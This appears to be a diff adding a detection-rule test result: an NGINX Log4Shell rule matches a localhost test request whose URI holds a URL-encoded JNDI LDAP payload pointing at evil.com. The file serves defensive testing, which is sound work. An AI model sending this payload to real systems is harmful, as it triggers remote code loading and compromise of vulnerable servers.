@@ -1,0 +1,3 @@
+Expected Rule: [NGINX Emerging Threat] Log4Shell attack
+Matched Rule: [NGINX Emerging Threat] Log4Shell attack test_id=SSTI_LOG4S_001-1772277057938-zje1c pattern_id=SSTI_LOG4S_001 uri=/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D client=127.0.0.1
+Rule Match: ✅ Match
